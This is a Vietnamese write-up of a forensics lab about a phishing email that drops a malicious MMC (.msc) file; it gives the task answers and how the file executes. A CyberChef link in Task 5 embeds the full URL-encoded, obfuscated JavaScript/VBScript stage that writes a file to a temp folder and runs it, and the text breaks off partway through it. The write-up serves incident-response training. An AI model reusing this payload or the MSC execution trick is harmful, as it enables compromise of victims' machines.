# Mô tả

GeekCmore is a new employee who recently noticed that his computer has been acting strangely. It might be due to a strange email he received earlier, so GeekCmore turned to you for help. He hopes that, as a forensics and incident response expert, you can assist him in investigating what happened and completing the related investigation report.

>Kiếm được bài này trên [DFIR-LABS](https://github.com/Azr43lKn1ght/DFIR-LABS) được tạo bởi crazyman,... có dạng khá là giống bài DFIR2025 II trong giải R3CTF nhưng dễ hơn

# Phân tích

**Bài cho ta một file email và một file pcap**

## Task 1

**What is the attacker's and victim's email address?**

Mở file `.eml` lên để xem email mà nạn nhân nhận được

>`alice@flycode.cn`

>`bob@flycode.cn`

## Task 2

**What is the md5 of the file dropped by the attacker?**

**What is the password of the file dropped by the attacker?**

Có thể tải file, và trong nội dung của email cũng chứa mật khẩu

>f436b02020fa59f3f71e0b6dcac6c7d3

>2024qwbs8

## Task 3

**What is the suffix of the attack payload used by the attacker?**

**What is the full name of the default way to open the attack payload file used by the attacker?**

Giải nén ta được một file `.msc` khi tìm hiểu trên mạng thì biết được đây là một file `Microsoft Management Console (MMC) document`

>msc

>Microsoft Management Consoles

## Task 4

**On which line of the attack payload file is the initial execution statement of the sample dropped by the attacker?**

Đưa file `.msc` vào một text editor, thấy ở dòng 92 có thực hiện decode URL một chuỗi dài sau đó dòng 97 chạy `<String ID="39" Refs="1">res://apds.dll/redirect.html?target=javascript:eval(external.Document.ScopeNamespace.GetRoot().Name)</String>`

- `res://apds.dll/redirect.html` Tải 1 trang HTML nhúng trong file DLL

- `?target=javascript:eval(external.Document.ScopeNamespace.GetRoot().Name)` Gọi eval để chạy javascript

>97

## Task 5

**After the initial execution, what language is used by the attacker to load the second payload?**

[Decode URL](https://gchq.github.io/CyberChef/#recipe=URL_Decode(true)&input=ImZvciUyMCUyOGklM0QwJTNCaSUzQ3UlMkVsZW5ndGglM0JpJTJCJTJCJTI5JTdCaCUzRHUlMkVjaGFyQ29kZUF0JTI4aSUyOSUyRXRvU3RyaW5nJTI4MTYlMjklM0J2JTJCJTNEJTI4JTIyMDAwJTIyJTJCaCUyOSUyRXNsaWNlJTI4JTJENCUyOSUzQiU3RCIpKTt2YXIgc049ZXh0ZXJuYWwuRG9jdW1lbnQuU2NvcGVOYW1lc3BhY2U7dmFyIHJOPXNOLkdldFJvb3QoKTt2YXIgbU49c04uR2V0Q2hpbGQock4pO3ZhciBkTj1zTi5HZXROZXh0KG1OKTtleHRlcm5hbC5Eb2N1bWVudC5BY3RpdmVWaWV3LkFjdGl2ZVNjb3BlTm9kZT1kTjtkTz1leHRlcm5hbC5Eb2N1bWVudC5BY3RpdmVWaWV3LkNvbnRyb2xPYmplY3Q7ZXh0ZXJuYWwuRG9jdW1lbnQuQWN0aXZlVmlldy5BY3RpdmVTY29wZU5vZGU9bU47dmFyIFhNTD1kTztYTUwuYXN5bmM9ZmFsc2U7dmFyIHhzbD1YTUw7eHNsLmxvYWRYTUwodW5lc2NhcGUoIiUzQyUzRnhtbCUyMHZlcnNpb24lM0QlMjcxLjAlMjclM0YlM0UlMEElM0NzdHlsZXNoZWV0JTBBJTIwJTIwJTIwJTIweG1sbnMlM0QlMjJodHRwJTNBLy93d3cudzMub3JnLzE5OTkvWFNML1RyYW5zZm9ybSUyMiUyMHhtbG5zJTNBbXMlM0QlMjJ1cm4lM0FzY2hlbWFzLW1pY3Jvc29mdC1jb20lM0F4c2x0JTIyJTBBJTIwJTIwJTIwJTIweG1sbnMlM0F1c2VyJTNEJTIycGxhY2Vob2xkZXIlMjIlMEElMjAlMjAlMjAlMjB2ZXJzaW9uJTNEJTIyMS4wJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTNDb3V0cHV0JTIwbWV0aG9kJTNEJTIydGV4dCUyMi8lM0UlMEElMjAlMjAlMjAlMjAlM0NtcyUzQXNjcmlwdCUyMGltcGxlbWVudHMtcHJlZml4JTNEJTIydXNlciUyMiUyMGxhbmd1YWdlJTNEJTIyVkJTY3JpcHQlMjIlM0UlMEElMDklM0MlMjElNUJDREFUQSU1QiUwQURpbSUyMG1zY0xMJTBBbXNjTEwlM0QlMjJfTVNDJTIyJTBBRm9yJTIwaSUzRDElMjB0byUyMExlbiUyOG1zY0xMJTI5JTIwU3RlcCUyMDQlMEFvRm1YQ1RnJTNEb0ZtWENUZyUyMCUyNiUyMENoclclMjhDTG5nJTI4JTIyJTI2JTIyJTI2Q2hyJTI4NzIlMjklMjAlMjYlMjBNaWQlMjhtc2NMTCUyQ2klMkM0JTI5JTI5JTI5JTBBTmV4dCUwQVNldCUyMFJUY3hGbXklM0RDcmVhdGVPYmplY3QlMjhDaHIlMjgzNDQwLTMzNjMlMjklMjZDaHIlMjgxMDUlMjklMjZDaHIlMjhJbnQlMjglMjI5OSUyMiUyOSUyOSUyNiUyMnIlMjIlMjZDaHIlMjhJbnQlMjglMjIlMjZINmYlMjIlMjklMjklMjZDaHIlMjglMjZINzMlMjklMjZDaHIlMjhJbnQlMjglMjIxMTElMjIlMjklMjklMjZDaHIlMjgxMDIlMjklMjZDaHIlMjglMjZINzQlMjklMjZDaHIlMjg0NiUyOSUyNkNociUyOEludCUyOCUyMjg4JTIyJTI5JTI5JTI2Q2hyJTI4NzclMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINGMlMjIlMjklMjklMjYlMjJEJTIyJTI2JTIyTyUyMiUyNiUyMk0lMjIlMjAlMjklMEFSVGN4Rm15LkFzeW5jJTNEQ2hyJTI4SW50JTI4JTIyJTI2SDQ2JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyOTclMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIxMDglMjIlMjklMjklMjYlMjJzJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY1JTIyJTI5JTI5JTBBUlRjeEZteS5Mb2FkJTI4JTIwb0ZtWENUZyUyMCUyOSUwQUFKOHAlMEFGdW5jdGlvbiUyMFhrN2ZicDh2JTI4aW5wJTI5JTBBRGltJTIwcTRYUGJ2b1YlMEFEaW0lMjBIeFdLJTBBU2V0JTIwcTRYUGJ2b1YlM0RDcmVhdGVPYmplY3QlMjhDaHIlMjglMjZINGQlMjklMjYlMjJTJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDU4JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNzclMjIlMjklMjklMjZDaHIlMjgyNDc5ODgvMzI2MyUyOSUyNkNociUyOCUyNkgzMiUyOSUyNkNociUyOEludCUyOCUyMiUyNkgyZSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjY4JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDRmJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDRkJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDQ0JTI5JTI2Q2hyJTI4MjQyNy0yMzE2JTI5JTI2JTIyYyUyMiUyNkNociUyOEludCUyOCUyMiUyNkg3NSUyMiUyOSUyOSUyNkNociUyOCUyNkg2ZCUyOSUyNkNociUyODEwMSUyOSUyNkNociUyOCUyNkg2ZSUyOSUyNkNociUyOC0xNzkwJTJCMTkwNiUyOSUyOSUwQVNldCUyMEh4V0slM0RxNFhQYnZvVi5jcmVhdGVFbGVtZW50JTI4Q2hyJTI4NTQ1LTQ0OCUyOSUyOSUwQUh4V0suRGF0YVR5cGUlM0RDaHIlMjg5OCUyOSUyNkNociUyOEludCUyOCUyMjEwNSUyMiUyOSUyOSUyNkNociUyODExMCUyOSUyNkNociUyOEludCUyOCUyMjQ2JTIyJTI5JTI5JTI2Q2hyJTI4OTglMjklMjZDaHIlMjg5NyUyOSUyNkNociUyODExNSUyOSUyNkNociUyOEludCUyOCUyMjEwMSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzNiUyMiUyOSUyOSUyNkNociUyODYyMzgtNjE4NiUyOSUwQUh4V0suVGV4dCUzRGlucCUwQVhrN2ZicDh2JTNESHhXSy5ub2RlVHlwZWRWYWx1ZSUwQUVuZCUyMEZ1bmN0aW9uJTBBRnVuY3Rpb24lMjBBSjhwJTI4JTI5JTBBT24lMjBFcnJvciUyMFJlc3VtZSUyME5leHQlMEFEaW0lMjBBZ1V2Y0N1SHp6YmwlMEFEaW0lMjBEZkFWNDB5JTBBRGltJTIwZ3dxaGhWJTBBRGltJTIwSkpOZSUwQURpbSUyME13N1UlMEFEaW0lMjBPOEIxT3JrVFclMEFPTXhhJTNEQ2hyJTI4SW50JTI4JTIyNTMlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzElMjIlMjklMjklMjZDaHIlMjglMjZIMzclMjklMjZDaHIlMjg1MSUyOSUyNkNociUyODUyJTI5JTI2Q2hyJTI4MTAxJTI5JTI2Q2hyJTI4NTYlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjUlMjIlMjklMjklMjZDaHIlMjglMjZIMzclMjklMjZDaHIlMjhJbnQlMjglMjIxMDElMjIlMjklMjklMjZDaHIlMjglMjZINjMlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzQlMjIlMjklMjklMjZDaHIlMjglMjZIMzclMjklMjZDaHIlMjhJbnQlMjglMjIxMDElMjIlMjklMjklMjZDaHIlMjglMjZINjMlMjklMjZDaHIlMjhJbnQlMjglMjI1NSUyMiUyOSUyOSUyNkNociUyODUzJTI5JTI2Q2hyJTI4SW50JTI4JTIyNTElMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI5OSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUwJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDM1JTI5JTI2Q2hyJTI4NTAlMjklMjZDaHIlMjglMjZINjElMjklMjZDaHIlMjhJbnQlMjglMjI0OCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjU1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDYyJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMyJTI5JTI2Q2hyJTI4JTI2SDYzJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNDklMjIlMjklMjklMjZDaHIlMjg1NCUyOSUyNkNociUyOCUyNkg2MiUyOSUyNkNociUyODUzJTI5JTI2Q2hyJTI4SW50JTI4JTIyOTklMjIlMjklMjklMjZDaHIlMjglMjZIMzQlMjklMjZDaHIlMjhJbnQlMjglMjI5NyUyMiUyOSUyOSUyNkNociUyOCUyNkgzMiUyOSUyNkNociUyODQ4JTI5JTI2Q2hyJTI4NDklMjklMjZDaHIlMjglMjZINjMlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzUlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIxMDIlMjIlMjklMjklMjZDaHIlMjg1MSUyOSUyNkNociUyOEludCUyOCUyMjk3JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTUlMjIlMjklMjklMjZDaHIlMjglMjZINjYlMjklMjZDaHIlMjg1MyUyOSUyNkNociUyODQ5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTQlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzclMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI1NCUyMiUyOSUyOSUyNkNociUyOCUyNkg2NiUyOSUyNkNociUyOEludCUyOCUyMjUwJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMwJTI5JTI2Q2hyJTI4JTI2SDMxJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY0JTIyJTI5JTI5JTI2Q2hyJTI4NTMlMjklMjZDaHIlMjglMjZIMzElMjklMjZDaHIlMjhJbnQlMjglMjI1NCUyMiUyOSUyOSUyNkNociUyODU2JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTMlMjIlMjklMjklMjZDaHIlMjg1NCUyOSUyNkNociUyOCUyNkg2NiUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2NCUyMiUyOSUyOSUyNkNociUyODU1JTI5JTI2Q2hyJTI4MTAyJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM1JTIyJTI5JTI5JTI2Q2hyJTI4NDklMjklMjZDaHIlMjhJbnQlMjglMjI1NSUyMiUyOSUyOSUyNkNociUyODEwMSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2NCUyMiUyOSUyOSUyNkNociUyODk5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyOTglMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI1NiUyMiUyOSUyOSUyNkNociUyODU3JTI5JTI2Q2hyJTI4JTI2SDM1JTI5JTI2Q2hyJTI4SW50JTI4JTIyNDklMjIlMjklMjklMjZDaHIlMjglMjZIMzYlMjklMjZDaHIlMjglMjZIMzglMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzYlMjIlMjklMjklMjZDaHIlMjg1MSUyOSUyNkNociUyOEludCUyOCUyMjQ5JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNDklMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzYlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI1MCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzMSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjU2JTIyJTI5JTI5JTI2Q2hyJTI4NTYlMjklMjZDaHIlMjgxMDAlMjklMjZDaHIlMjhJbnQlMjglMjI1MyUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjk4JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDM3JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTQlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI1NiUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUyJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTclMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzAlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI0OSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjk3JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTUlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzclMjIlMjklMjklMjZDaHIlMjgxMDElMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzUlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjYlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjYlMjIlMjklMjklMjZDaHIlMjglMjZIMzAlMjklMjZDaHIlMjglMjZIMzglMjklMjZDaHIlMjg0OCUyOSUyNkNociUyOEludCUyOCUyMjQ4JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTElMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMzElMjIlMjklMjklMjZDaHIlMjglMjZIMzAlMjklMjZDaHIlMjglMjZIMzAlMjklMjZDaHIlMjg1MSUyOSUyNkNociUyODQ5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM2JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM3JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMwJTI5JTI2Q2hyJTI4SW50JTI4JTIyNTYlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI0OCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzMCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzMyUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUwJTIyJTI5JTI5JTI2Q2hyJTI4NTQlMjklMjZDaHIlMjg1MyUyOSUyNkNociUyOEludCUyOCUyMjEwMSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUzJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDM4JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDMxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY2JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMzJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDMwJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMwJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDMzJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDMzJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM2JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDM1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTAxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNTMlMjIlMjklMjklMjZDaHIlMjglMjZIMzQlMjklMjZDaHIlMjhJbnQlMjglMjIxMDElMjIlMjklMjklMjZDaHIlMjg1MSUyOSUyNkNociUyOCUyNkg2NSUyOSUyNkNociUyOCUyNkgzOCUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzOCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUyJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyOTklMjIlMjklMjklMjZDaHIlMjg1NSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2NSUyMiUyOSUyOSUyNkNociUyOCUyNkg2MiUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2NiUyMiUyOSUyOSUyNkNociUyOCUyNkgzNCUyOSUyNkNociUyOEludCUyOCUyMjEwMSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjQ4JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDYxJTI5JTI2Q2hyJTI4NTYlMjklMjZDaHIlMjgxMDAlMjklMjZDaHIlMjhJbnQlMjglMjI1MyUyMiUyOSUyOSUyNkNociUyODk4JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY2JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTAyJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNDglMjIlMjklMjklMjZDaHIlMjglMjZIMzklMjklMjZDaHIlMjg0OCUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzMCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjUwJTIyJTI5JTI5JTI2Q2hyJTI4MTAxJTI5JTI2Q2hyJTI4NDglMjklMjZDaHIlMjhJbnQlMjglMjI0OCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjU1JTIyJTI5JTI5JTI2Q2hyJTI4NDglMjklMjZDaHIlMjglMjZIMzAlMjklMjZDaHIlMjglMjZIMzAlMjklMjZDaHIlMjhJbnQlMjglMjI1NCUyMiUyOSUyOSUyNkNociUyOCUyNkgzNCUyOSUyNkNociUyODQ4JTI5JTI2Q2hyJTI4SW50JTI4JTIyNDglMjIlMjklMjklMjZDaHIlMjg1NCUyOSUyNkNociUyOCUyNkgzNiUyOSUwQVNldCUyMEFnVXZjQ3VIenpibCUzRENyZWF0ZU9iamVjdCUyOENociUyOEludCUyOCUyMiUyNkg1NyUyMiUyOSUyOSUyNkNociUyODUzNy00NTQlMjklMjZDaHIlMjg5OSUyOSUyNkNociUyODMyMTgtMzEwNCUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2OSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg3MCUyMiUyOSUyOSUyNkNociUyOC0zMDgxJTJCMzE5NyUyOSUyNkNociUyOCUyNkgyZSUyOSUyNkNociUyOCUyNkg1MyUyOSUyNkNociUyODEwNCUyOSUyNiUyMmUlMjIlMjZDaHIlMjhJbnQlMjglMjIxMDglMjIlMjklMjklMjYlMjJsJTIyJTI5JTBBU2V0JTIwRGZBVjQweSUzRENyZWF0ZU9iamVjdCUyOENociUyOEludCUyOCUyMjgzJTIyJTI5JTI5JTI2Q2hyJTI4NjU5Ny02NDk4JTI5JTI2Q2hyJTI4MTE0JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY5JTIyJTI5JTI5JTI2JTIycCUyMiUyNkNociUyOEludCUyOCUyMjExNiUyMiUyOSUyOSUyNkNociUyODI2OTMtMjU4OCUyOSUyNiUyMm4lMjIlMjZDaHIlMjhJbnQlMjglMjIxMDMlMjIlMjklMjklMjZDaHIlMjgxMjUyMTIvMjcyMiUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0NiUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjEwNSUyMiUyOSUyOSUyNkNociUyODEwOCUyOSUyNkNociUyODEwMSUyOSUyNkNociUyODIyOTA4LzI3NiUyOSUyNiUyMnklMjIlMjYlMjJzJTIyJTI2Q2hyJTI4NDczMy00NjE3JTI5JTI2JTIyZSUyMiUyNkNociUyOEludCUyOCUyMjEwOSUyMiUyOSUyOSUyNkNociUyOCUyNkg0ZiUyOSUyNkNociUyOEludCUyOCUyMjk4JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDZhJTI5JTI2Q2hyJTI4MTAxJTI5JTI2Q2hyJTI4OTklMjklMjZDaHIlMjhJbnQlMjglMjIxMTYlMjIlMjklMjklMjklMEFPOEIxT3JrVFclM0RBZ1V2Y0N1SHp6YmwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzJTI4Q2hyJTI4MzclMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINTAlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINzIlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIxMTElMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjclMjIlMjklMjklMjZDaHIlMjgxMTQlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjElMjIlMjklMjklMjZDaHIlMjgxMDklMjklMjYlMjJGJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY5JTIyJTI5JTI5JTI2JTIybCUyMiUyNiUyMmUlMjIlMjZDaHIlMjgtMTYwNSUyQjE3MjAlMjklMjZDaHIlMjhJbnQlMjglMjIzNyUyMiUyOSUyOSUyOSUwQVA1OWI2c2NSMlREOSUzRE84QjFPcmtUVyUyMCUyNiUyMENociUyODIwODgtMTk5NiUyOSUyNiUyMkMlMjIlMjZDaHIlMjhJbnQlMjglMjIxMDglMjIlMjklMjklMjZDaHIlMjgyNzA3MjkvMjQzOSUyOSUyNkNociUyOEludCUyOCUyMjExNyUyMiUyOSUyOSUyNiUyMmQlMjIlMjZDaHIlMjhJbnQlMjglMjIxMDIlMjIlMjklMjklMjZDaHIlMjgxMDglMjklMjZDaHIlMjg5NyUyOSUyNkNociUyOEludCUyOCUyMjExNCUyMiUyOSUyOSUyNkNociUyOCUyNkg2NSUyOSUwQURmQVY0MHkuQ3JlYXRlRm9sZGVyJTI4UDU5YjZzY1IyVEQ5JTI5JTBBZ3dxaGhWJTNEUDU5YjZzY1IyVEQ5JTIwJTI2JTIwQ2hyJTI4OTIlMjklMjAlMjYlMjBDaHIlMjhJbnQlMjglMjI3MSUyMiUyOSUyOSUyNkNociUyODg1JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDUwJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDJlJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDY1JTI5JTI2Q2hyJTI4JTI2SDc4JTI5JTI2Q2hyJTI4MTgwNSUyRDE3MDQlMjklMEFKSk5lJTNEUDU5YjZzY1IyVEQ5JTIwJTI2JTIwQ2hyJTI4OTIlMjklMjAlMjYlMjBDaHIlMjhJbnQlMjglMjIlMjZINmMlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjklMjIlMjklMjklMjZDaHIlMjg5OCUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2MyUyMiUyOSUyOSUyNkNociUyODExNyUyOSUyNkNociUyOCUyNkg3MiUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2YyUyMiUyOSUyOSUyNkNociUyOCUyNkgyZSUyOSUyNkNociUyOCUyNkg2NCUyOSUyNkNociUyODEwOCUyOSUyNkNociUyOEludCUyOCUyMjEwOCUyMiUyOSUyOSUwQUZvciUyMGklM0QxJTIwdG8lMjBMZW4lMjhPTXhhJTI5JTIwU3RlcCUyMDQlMEFGUlVSWCUzREZSVVJYJTIwJTI2JTIwQ2hyVyUyOENMbmclMjglMjIlMjYlMjIlMjZDaHIlMjg3MiUyOSUyMCUyNiUyME1pZCUyOE9NeGElMkNpJTJDNCUyOSUyOSUyOSUwQU5leHQlMEFNdzdVJTNERGZBVjQweS5HZXRTcGVjaWFsRm9sZGVyJTI4MiUyOSUyMCUyNiUyMENociUyODkyJTI5JTIwJTI2JTIwRlJVUlglMEFTZXQlMjBhWlBIeHR6NCUzRFJUY3hGbXkuc2VsZWN0Tm9kZXMlMjglMjBDaHIlMjgyOTI4MS82MjMlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINGQlMjIlMjklMjklMjZDaHIlMjg3NyUyOSUyNkNociUyODE1ODctMTUyMCUyOSUyNkNociUyOEludCUyOCUyMjk1JTIyJTI5JTI5JTI2Q2hyJTI4NjclMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINmYlMjIlMjklMjklMjYlMjJuJTIyJTI2Q2hyJTI4SW50JTI4JTIyMTE1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDZmJTIyJTI5JTI5JTI2Q2hyJTI4MTA4JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDY1JTIyJTI5JTI5JTI2Q2hyJTI4NzAlMjklMjZDaHIlMjglMjZINjklMjklMjZDaHIlMjgxMDglMjklMjZDaHIlMjgxMDElMjklMjZDaHIlMjg0NyUyOSUyNiUyMkIlMjIlMjYlMjJpJTIyJTI2Q2hyJTI4NjcxMC02NjAwJTI5JTI2Q2hyJTI4JTI2SDYxJTI5JTI2Q2hyJTI4SW50JTI4JTIyMTE0JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTIxJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDUzJTI5JTI2Q2hyJTI4MTE2JTI5JTI2JTIybyUyMiUyNkNociUyODIyMTg0NC8xOTQ2JTI5JTI2Q2hyJTI4OTclMjklMjZDaHIlMjhJbnQlMjglMjIxMDMlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjUlMjIlMjklMjklMjZDaHIlMjg0NjIxLTQ1NzQlMjklMjZDaHIlMjglMjZINDIlMjklMjZDaHIlMjgxMDUlMjklMjZDaHIlMjhJbnQlMjglMjIxMTAlMjIlMjklMjklMjZDaHIlMjglMjZINjElMjklMjZDaHIlMjg4MDE5LTc5MDUlMjklMjYlMjJ5JTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDViJTIyJTI5JTI5JTI2Q2hyJTI4NjQlMjklMjZDaHIlMjhJbnQlMjglMjI3OCUyMiUyOSUyOSUyNkNociUyOCUyNkg2MSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2ZCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2NSUyMiUyOSUyOSUyNkNociUyOCUyNkgzZCUyOSUyNkNociUyOEludCUyOCUyMiUyNkgyNyUyMiUyOSUyOSUyNkNociUyOCUyNkg0MyUyOSUyNkNociUyODc5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDRlJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDUzJTI5JTI2Q2hyJTI4ODI5MC04MjExJTI5JTI2Q2hyJTI4SW50JTI4JTIyNzYlMjIlMjklMjklMjZDaHIlMjg2Njc3LTY2MDglMjklMjZDaHIlMjglMjZINWYlMjklMjZDaHIlMjhJbnQlMjglMjI4NCUyMiUyOSUyOSUyNkNociUyODEwMTgtOTM2JTI5JTI2Q2hyJTI4JTI2SDQ1JTI5JTI2Q2hyJTI4JTI2SDQ1JTI5JTI2Q2hyJTI4SW50JTI4JTIyMzklMjIlMjklMjklMjZDaHIlMjglMjZINWQlMjklMjAlMjklMjAlMEFycXNnTzJtQmZ1JTNEYVpQSHh0ejQlMjgwJTI5LnRleHQlMEFVb0xBdW5XJTNEWGs3ZmJwOHYlMjhycXNnTzJtQmZ1JTI5JTBBRGltJTIwalhuYVdlTFExMiUwQVNldCUyMGpYbmFXZUxRMTIlM0RDcmVhdGVPYmplY3QlMjhDaHIlMjg2NSUyOSUyNkNociUyOCUyNkg0NCUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0ZiUyMiUyOSUyOSUyNkNociUyODY4JTI5JTI2Q2hyJTI4NDU3NC00NTA4JTI5JTI2Q2hyJTI4NDYlMjklMjYlMjJTJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDc0JTIyJTI5JTI5JTI2Q2hyJTI4Njk2MC02ODQ2JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTAxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDYxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTA5JTIyJTI5JTI5JTI5JTBBalhuYVdlTFExMi5UeXBlJTNEMSUwQWpYbmFXZUxRMTIuT3BlbiUwQWpYbmFXZUxRMTIuV3JpdGUlMjBVb0xBdW5XJTBBalhuYVdlTFExMi5TYXZlVG9GaWxlJTIwTXc3VSUyQzIlMEFBZ1V2Y0N1SHp6YmwucnVuJTIwJTIyJTIyJTIyJTIyJTIwJTI2JTIwTXc3VSUyMCUyNiUyMCUyMiUyMiUyMiUyMiUyQzElMkNmYWxzZSUwQVNldCUyMGF